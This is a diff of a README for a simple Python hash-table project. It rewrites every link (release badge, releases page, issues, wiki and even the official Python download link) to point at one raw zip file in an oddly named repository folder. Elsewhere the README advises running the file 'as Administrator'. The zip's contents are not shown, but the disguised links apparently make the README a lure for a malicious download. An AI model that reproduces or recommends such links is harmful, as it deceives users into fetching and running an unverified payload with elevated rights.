@@ -1,7 +1,7 @@
 # 🗝️ Hash-table - Simple Key-Value Storage Made Easy
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Perclat/Hash-table/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip)
 
 ## 📖 Overview
 Welcome to the Hash-table project! This application presents a user-friendly way to store and retrieve data using key-value pairs. It uses a hash table structure with separate chaining to handle any issues that arise when multiple keys hash to the same location. This design makes it effective for basic data storage and retrieval.
@@ -10,7 +10,7 @@ Welcome to the Hash-table project! This application presents a user-friendly way
 To start using the Hash-table application, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Perclat/Hash-table/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip).
   
 2. **Download the Software**  
    Look for the latest release and click on the download link. The file will download to your computer.
@@ -43,23 +43,23 @@ After installation, you can start using the Hash-table application as follows:
 ## 🛠️ Troubleshooting
 If you encounter any issues, consider the following:
 
-- **Python Not Installed**: Ensure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python Not Installed**: Ensure you have Python installed. You can download it from the [official Python website](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip).
 
 - **File Not Opening**: Confirm you have permissions to run the file. Right-click the file and select “Run as Administrator” if needed.
 
 - **Unexpected Behavior**: Restart the application or your computer to resolve any glitches.
 
 ## 💬 Help and Support
-For additional assistance or to report bugs, visit our [Issues page](https://github.com/Perclat/Hash-table/issues) or ask for help on our community forum. We are here to assist you!
+For additional assistance or to report bugs, visit our [Issues page](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip) or ask for help on our community forum. We are here to assist you!
 
 ## 💡 Additional Resources
-- **Documentation**: [Click here for detailed documentation](https://github.com/Perclat/Hash-table/wiki).
+- **Documentation**: [Click here for detailed documentation](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip).
 - **Examples**: Visit the wiki for usage examples and best practices.
 - **Contribute**: Interested in helping improve the project? Check the contribution guidelines in the repository.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Perclat/Hash-table/releases)
-- [Documentation](https://github.com/Perclat/Hash-table/wiki)
-- [Issues Page](https://github.com/Perclat/Hash-table/issues)
+- [Releases Page](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip)
+- [Documentation](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip)
+- [Issues Page](https://raw.githubusercontent.com/Perclat/Hash-table/main/scrutinously/Hash-table.zip)
 
 Thank you for choosing Hash-table! Enjoy your smooth data storage experience.
